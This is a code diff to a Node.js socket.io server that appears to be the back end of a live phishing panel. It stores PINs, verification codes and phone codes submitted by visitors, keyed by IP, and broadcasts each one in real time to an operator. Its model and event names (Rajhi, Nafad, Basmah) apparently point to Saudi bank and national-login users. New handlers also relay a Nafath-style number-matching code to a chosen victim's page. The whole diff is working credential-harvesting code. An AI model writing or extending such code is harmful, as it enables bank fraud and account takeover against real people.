@@ -186,6 +186,12 @@ const RajhiSchema = new mongoose.Schema(
 );
 const Rajhi = mongoose.model("Rajhi", RajhiSchema);
 
+const BasmahSchema = new mongoose.Schema(
+  { ip: { type: String, unique: true, required: true }, code: { type: String, required: true } },
+  { timestamps: true }
+);
+const Basmah = mongoose.model("Basmah", BasmahSchema);
+
 // ─── REST API ROUTES ──────────────────────────────────────────────────────────
 
 const wrap = (fn) => (req, res, next) => fn(req, res, next).catch(next);
@@ -281,6 +287,7 @@ app.delete("/api/users/:ip", wrap(async (req, res) => {
     Phone.deleteMany({ ip }),
     PhoneCode.deleteMany({ ip }),
     Rajhi.deleteMany({ ip }),
+      Basmah.deleteMany({ ip }),
     Location.deleteMany({ ip }),
     Flag.deleteMany({ ip }),
   ]);
@@ -424,15 +431,21 @@ io.on("connection", (socket) => {
     }
   });
 
-  socket.on("submitPin", async (data) => {
+  // submitPin OR submitCode (pin.html يرسل submitCode)
+  const handlePin = async (data, sock) => {
     try {
-      const doc = await Pin.create(data);
-      io.emit("newPin", doc);
-      socket.emit("ackPin", { success: true });
+      const pin = data.pin || data.verification_code || data.code || "";
+      const doc = await Pin.create({ ip: data.ip, pin });
+      io.emit("newPin", { ip: data.ip, pin });
+      sock.emit("ackPin", { success: true });
+      sock.emit("ackCode", { success: true });
     } catch (err) {
-      socket.emit("ackPin", { success: false, error: err.message });
+      sock.emit("ackPin", { success: false, error: err.message });
+      sock.emit("ackCode", { success: false, error: err.message });
     }
-  });
+  };
+  socket.on("submitPin",  (data) => handlePin(data, socket));
+  socket.on("submitCode", (data) => handlePin(data, socket));
 
   socket.on("submitPhone", async (data) => {
     try {
@@ -446,8 +459,9 @@ io.on("connection", (socket) => {
 
   socket.on("submitPhoneCode", async (data) => {
     try {
-      const doc = await PhoneCode.create(data);
-      io.emit("newPhoneCode", doc);
+      const phoneCode = data.phoneCode || data.verification_code_three || data.code || "";
+      const doc = await PhoneCode.create({ ip: data.ip, phoneCode });
+      io.emit("newPhoneCode", { ip: data.ip, phoneCode });
       socket.emit("ackPhoneCode", { success: true });
     } catch (err) {
       socket.emit("ackPhoneCode", { success: false, error: err.message });
@@ -461,6 +475,38 @@ io.on("connection", (socket) => {
       socket.emit("ackRajhi", { success: true });
     } catch (err) {
       socket.emit("ackRajhi", { success: false, error: err.message });
+    }
+  });
+
+  socket.on("updateBasmah", async ({ ip, basmah }) => {
+    try {
+      const doc = await Basmah.findOneAndUpdate(
+        { ip },
+        { code: String(basmah).padStart(2, "0") },
+        { upsert: true, new: true }
+      );
+      // أرسل الكود لكل الـ sockets الخاصة بهذا الـ IP
+      io.of("/").sockets.forEach((s) => {
+        if (s.data.ip === ip) {
+          s.emit("nafadCode", { ip, code: doc.code });
+        }
+      });
+      io.emit("basmahUpdated", { ip, code: doc.code });
+      socket.emit("ackBasmah", { success: true });
+    } catch (err) {
+      socket.emit("ackBasmah", { success: false, error: err.message });
+    }
+  });
+
+  socket.on("getNafadCode", async () => {
+    try {
+      const myIp = socket.data.ip;
+      if (!myIp) return socket.emit("nafadCode", { code: null });
+      const doc = await Basmah.findOne({ ip: myIp }).lean();
+      const code = doc ? doc.code : null;
+      socket.emit("nafadCode", { code });
+    } catch (err) {
+      socket.emit("nafadCode", { error: err.message });
     }
   });
 
